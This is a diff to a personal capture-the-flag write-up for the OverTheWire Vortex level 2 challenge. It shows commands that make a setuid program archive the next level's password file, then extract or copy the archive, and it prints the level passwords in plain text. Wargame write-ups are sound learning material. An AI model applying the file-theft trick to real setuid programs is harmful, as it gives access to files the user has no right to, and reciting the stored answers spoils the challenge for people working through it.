@@ -24,5 +24,27 @@ Username: vortex2 Password: 23anbT\rE
 
 Level 2:
 ------------------------------------------------
+vortex2@melissa:/etc/vortex_pass$ /vortex/vortex2 vortex3 vortex3 vortex3
+/bin/tar: U\211\345WVS\350Z: Cannot stat: No such file or directory
+/bin/tar: Exiting with failure status due to previous errors
 
-Username: vortex3 Password: 
+vortex2@melissa:/etc/vortex_pass$ ls -alh '/tmp/ownership.$$.tar'
+-rw-r--r-- 1 vortex3 vortex2 10K 2012-09-06 23:19 /tmp/ownership.$$.tar
+
+Method 1) 
+Untar and output to STDOUT :
+tar xf '/tmp/ownership.$$.tar' -O
+64ncXTvx#
+
+Method 2)
+Test with scp in verbose mode. $$ is interpreted so it should be correctly escaped. 
+scp -v vortex2@vortex.labs.overthewire.org:'test$$' .
+...
+
+Copy archive locally:
+scp vortex2@vortex.labs.overthewire.org:'/tmp/ownership.\$\$.tar' .
+
+Username: vortex3 Password: 64ncXTvx#
+
+Level 3:
+------------------------------------------------
